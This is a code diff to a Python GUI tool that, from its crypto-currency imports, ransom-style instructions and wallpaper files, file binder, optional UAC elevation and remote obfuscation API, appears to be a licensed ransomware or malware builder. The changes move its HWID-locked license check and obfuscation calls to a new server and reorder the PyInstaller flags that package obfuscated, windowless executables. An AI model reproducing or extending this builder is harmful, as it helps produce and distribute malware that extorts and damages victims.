@@ -1,8 +1,8 @@
 from tkinter import *
 from PIL import Image
+from colorama import Style, Fore
 from tkinter import filedialog as fd
 from bit import SUPPORTED_CURRENCIES
-from colorama import Style, Fore
 import customtkinter, subprocess, websocket, threading, coincurve, requests, tkinter, shutil, base64, fade, time, os
 
 customtkinter.set_appearance_mode("dark")
@@ -188,7 +188,7 @@ class App(customtkinter.CTk):
     
 
     def verify_key(self, key, label):
-        status_code = requests.get('https://ce13ac58-2803-4d07-801f-652e76b3e25c-00-1x3cz0h0gw60p.teams.replit.dev/api/verify', data={'key':key, 'hwid': self.hwid}).status_code
+        status_code = requests.get('https://septicx.pythonanywhere.com/api/verify', data={'key':key, 'hwid': self.hwid}).status_code
 
         if status_code == 200:
             label.configure(text='Success!')
@@ -376,7 +376,7 @@ class App(customtkinter.CTk):
             "ADMIN": admin
         }
 
-        src = requests.get('https://ce13ac58-2803-4d07-801f-652e76b3e25c-00-1x3cz0h0gw60p.teams.replit.dev/api/obfuscate', json={
+        src = requests.get('https://septicx.pythonanywhere.com/api/obfuscate', json={
             "options": {
                 "base": self.base,
                 "recursion": self.recursion,
@@ -407,7 +407,7 @@ class App(customtkinter.CTk):
             binder_args += ['--add-data', f'{dir}\\src\\temp\\binder_{filename};.']
 
         coincurve_path = "\\".join(coincurve.__file__.split("\\")[:-1])
-        command = ['python', '-m', 'PyInstaller', '--noconfirm', '--onefile', '--windowed', '--icon' if icon else '', icon if icon else '', '--uac-admin' if admin else '', '--upx-dir', 'build\\upx', '--workpath', 'build', '--specpath', 'build\\spec', '--add-data', f'{coincurve_path};coincurve', '--add-data', f'{dir}\\src\\temp\\instructions.txt;.', '--add-data', f'{dir}\\src\\files\\wallpaper.jpg;.', '--add-data', f'{dir}\\src\\files\\failed.jpg;.'] + binder_args + ['--clean', f'{dir}\\src\\output.py']
+        command = ['python', '-m', 'PyInstaller', '--noconfirm', '--windowed', '--onefile', '--icon' if icon else '', icon if icon else '', '--uac-admin' if admin else '', '--upx-dir', 'build\\upx', '--workpath', 'build', '--specpath', 'build\\spec', '--add-data', f'{coincurve_path};coincurve', '--add-data', f'{dir}\\src\\temp\\instructions.txt;.', '--add-data', f'{dir}\\src\\files\\wallpaper.jpg;.', '--add-data', f'{dir}\\src\\files\\failed.jpg;.'] + binder_args + ['--clean', f'{dir}\\src\\output.py']
         for _ in range(command.count('')):
             command.remove('')
         print(command)
